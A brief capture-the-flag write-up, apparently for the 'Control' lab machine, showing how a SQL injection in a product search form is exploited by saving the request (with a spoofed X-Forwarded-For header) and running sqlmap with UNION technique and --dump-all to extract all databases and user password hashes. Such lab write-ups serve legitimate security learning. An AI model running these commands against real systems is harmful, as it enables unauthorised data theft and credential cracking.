# Alternative way to exploit Control

## SQL Injection with SQLmap

After knowing that there is a **SQL Injection vulnerability** in the _"Find Products"_ feature, the GET request can be copied into a file _(control_sqli.req)_ and sent to **SQLmap**:
```
POST /search_products.php HTTP/1.1
Host: 10.10.10.167
(...)
X-Forwarded-For: 192.168.4.28

productName=p
```

```
sqlmap -r control_sqli.req --technique=U --batch
```

Dumping all the data from the databases:
```
sqlmap -r control_sqli.req --technique=U --batch --dump-all
```

It will dump all the data and also the hashes of the users.
